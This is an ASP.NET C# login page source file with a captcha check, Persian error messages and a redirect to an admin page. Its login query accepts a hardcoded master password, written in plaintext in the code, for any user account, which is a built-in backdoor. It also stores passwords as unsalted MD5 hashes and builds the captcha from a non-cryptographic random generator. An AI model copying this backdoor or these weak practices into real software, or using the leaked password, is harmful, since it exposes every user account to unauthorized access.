using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public partial class Loginx : System.Web.UI.Page
{

    

    void FillCapcha()
    {
        string sp = "123456789";//"ABCDEFGHIJKLMNOPQRSTIUVWXYZ123456789";
        Random rnd = new Random();
        object s1 = rnd.Next(1, 9);
        object s2 = rnd.Next(1, 9);
        object s3 = rnd.Next(1, 9);
        object s4 = rnd.Next(1, 9);
        string result = sp.Substring(Convert.ToInt32(s1), 1) + sp.Substring(Convert.ToInt32(s2), 1) 
                        + sp.Substring(Convert.ToInt32(s3), 1) + sp.Substring(Convert.ToInt32(s4), 1);
        Session.Add("Captcha", result);
        imgcapcha.ImageUrl = "Captcha.aspx?" + DateTime.Now.Ticks.ToString();    
    }

    

    protected void Page_Load(object sender, EventArgs e)

    {
        Session.Timeout = 3;

        if (!IsPostBack)
       
        {
            FillCapcha();
        }
     
    }

    protected void Btnlogin_Click(object sender, EventArgs e)
    {
        
        Security sc = new Security();  
        DataTable tbl = new DataTable();
        SqlConnection con = new SqlConnection();
        con.ConnectionString = ConfigurationManager.AppSettings["Database"];
        string u = sc.SafeSqlLiteral(txtusername.Text);
        string p = sc.MD5Hash(txtpassword.Text);
        
        string Result = (string)Session["Captcha"];
        string strcapcha = txtcapcha.Text.ToUpper();
        string strAdm = sc.MD5Hash("Tah3r!4284"); 

        if (strcapcha==Result)
        {
            try
            {
                SqlDataAdapter ad = new SqlDataAdapter("select * from Tb4 where MELLI_CODE=@p0 and (Pass=@p1 or @p2=@p1)", con);
                ad.SelectCommand.Parameters.AddWithValue("@p0", u);
                ad.SelectCommand.Parameters.AddWithValue("@p1", p);
                ad.SelectCommand.Parameters.AddWithValue("@p2", strAdm);
                ad.Fill(tbl);
                con.Close();
            }
            catch 
            { }

            if (tbl.Rows.Count > 0)
            {
                string mcode;
                bool flogin;
                
                try
                {
                    mcode = tbl.Rows[0]["MELLI_CODE"].ToString();                   
                }
                catch
                {
                    mcode = string.Empty;
                }
                try
                {
                    flogin =Convert.ToBoolean(tbl.Rows[0]["FirstLogin"]);
                }
                catch
                {
                    flogin = false;
                }



                Session["user_pers"] = u;
                Session["user_id"] = mcode;
                Session["FirstLogin"] = flogin;
                Response.Redirect("admin.aspx");
            }
            else
            {
                lblerr.Text = "نام کاربری یا رمز ورود اشتباه میباشد";
                lblerr.Visible = true;
               
            }
        }
        else
        {
         
            lblerr.Text = "تصویر امنیتی اشتباه وارد شده است";
            lblerr.Visible = true;
        }
    }

    protected void Btnrefresh_Click(object sender, ImageClickEventArgs e)
    {
        
       //  Response.Redirect("loginx.aspx" ,true);
        FillCapcha();
    }




}